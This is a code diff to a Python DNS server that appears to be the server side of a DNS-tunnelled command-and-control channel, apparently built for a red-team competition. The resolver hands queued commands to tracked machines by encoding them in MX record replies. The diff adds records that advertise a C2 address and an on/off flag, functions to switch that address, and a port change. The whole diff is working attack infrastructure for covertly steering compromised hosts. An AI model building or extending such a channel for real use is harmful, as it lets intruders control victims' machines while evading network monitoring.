@@ -24,10 +24,24 @@ def encodeCmd(cmd):
 class MemeResolver:
     knownHosts = []
     waitingCommands = dict()
+    c2IP = "samplec2.ists."
+    c2enabled = True
+
     def resolve(self,request,handler):
         reply = request.reply()
         qname = request.get_q().get_qname()
         print("Qname:", str(qname))
+        #print(request.get_q().qtype)  # 1: A, 28: AAAA, 15: MX, 5: CNAME
+
+        if qname == "c2.":
+            reply.add_answer(*RR.fromZone("c2. 60 IN MX 10 "+self.c2IP))
+            #todo: we can't just return an absolute -- we need a DNS name
+        if qname == "c2e.":
+            if self.c2enabled:
+                reply.add_answer(*RR.fromZone("c2e. 60 IN MX 10 yes."))
+            else:
+                reply.add_answer(*RR.fromZone("c2e. 60 IN MX 10 no."))
+
         if qname in self.waitingCommands:
             response = encodeCmd(self.waitingCommands[qname])
             reply.add_answer(*RR.fromZone(str(qname) + " 60 IN MX 10 "+response+"."))
@@ -39,6 +53,12 @@ class MemeResolver:
         print(reply)
         return reply
 
+    def disableC2(self):
+        self.c2enabled = False
+
+    def setC2(self, ip):
+        self.c2IP = ip
+
 def machineList(machines):
     if len(machines) == 0:
         print("No known machines.")
@@ -48,7 +68,7 @@ def machineList(machines):
 
 def main():
     resolver = MemeResolver()
-    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
+    server = DNSServer(resolver, port=5354, address="0.0.0.0", tcp=False)
     server.start_thread()
     print("Server launched.")
     print("Commands:")
